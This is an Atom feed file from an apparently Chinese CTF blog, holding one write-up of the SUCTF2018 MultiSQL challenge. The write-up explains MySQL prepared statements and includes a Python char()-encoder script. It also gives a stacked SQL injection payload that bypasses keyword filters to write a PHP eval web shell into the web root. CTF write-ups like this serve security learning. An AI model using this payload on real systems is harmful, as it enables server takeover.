@@ -1,0 +1,200 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;sql二次注入&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-08-11T13:38:12.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <entry>
+        <id>http://odiws.github.io/2024/08/11/SUCTF2018-MultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
+        <title>[SUCTF2018]MultiSQL-MySQL预处理学习</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/08/11/SUCTF2018-MultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
+        <content type="html">&lt;h2 id=&#34;suctf2018multisql-mysql预处理学习&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf2018multisql-mysql预处理学习&#34;&gt;#&lt;/a&gt; [SUCTF2018] MultiSQL-MySQL 预处理学习&lt;/h2&gt;
+&lt;p&gt;[SUCTF 2018] MultiSQL-MySQL 预处理学习&lt;br&gt;
+进入题目后，注册账户登录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;编辑头像可以上传文件，但是上传了 php 文件还是会变成 jpg 格式&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再看用户信息这里，id=2 那里可以随意更改，存在越权，1 就是 admin&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里接下来要用到 MySQL 的预处理，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vamllcm9uZzEyL3AvODg4MjUzNC5odG1s&#34;&gt;参考文章&lt;/span&gt;&lt;br&gt;
+ set&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; set @a=&#39;select version()&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&amp;gt; select @a;
++------------------+
+| @a               |
++------------------+
+| select version() |
++------------------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;set 的作用就是定义一个变量，变量的命名必须是 @开头。&lt;/p&gt;
+&lt;p&gt;prepare 和 execute&lt;br&gt;
+prepare 语句用于预定义一个语句，并可以指定预定义语句名称。execute 则是执行预定义语句。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;prepare prepare_name from “sql语句”
+
+execute prepare_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;示例&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; prepare t from @a;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+MariaDB [(none)]&amp;gt; execute t;
++-------------------+
+| version()         |
++-------------------+
+| 10.1.29-MariaDB-6 |
++-------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结合起来利用就是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; set @a=&#39;select version()&#39;;
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [(none)]&amp;gt; prepare t from @a;
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+MariaDB [(none)]&amp;gt; execute t;
++-------------------+
+| version()         |
++-------------------+
+| 10.1.29-MariaDB-6 |
++-------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这题 fuzz 测试后发现过滤了 union，select ，&amp;amp;，|，过滤了 select 然后存在堆叠注入的可以使用预处理注入，尝试写入 shell，因为过滤了 select 等字符，使用 char () 绕过，需要执行的语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;select ‘&amp;lt;?php eval($_POST[_]);?&amp;gt;’ into outfile ‘/var/www/html/favicon/shell.php’;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用脚本编程十进制：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;str=&amp;quot;select &#39;&amp;lt;?php eval($_POST[_]);?&amp;gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php&#39;;&amp;quot;
+len_str=len(str)
+for i in range(0,len_str):
+	if i == 0:
+		print(&#39;char(%s&#39;%ord(str[i]),end=&amp;quot;&amp;quot;)
+	else:
+		print(&#39;,%s&#39;%ord(str[i]),end=&amp;quot;&amp;quot;)
+print(&#39;)&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;结果为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;利用该 payload 写入 shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接下来访问 shell 所在的位置并发送命令&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2018%5DMultiSQL-MySQL%E9%A2%84%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;flag 应该在 WelL_Th1s_14_fl4g&lt;/p&gt;
+&lt;p&gt;参考文章 ：[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NqZGdnL2FydGljbGUvZGV0YWlscy8xMTY2NTIwNTQ=&#34;&gt;SUCTF 2018] MultiSQL-MySQL 预处理学习_suctf2018 multi ssql-CSDN 博客&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="sql二次注入" />
+        <updated>2024-08-11T13:38:12.000Z</updated>
+    </entry>
+</feed>
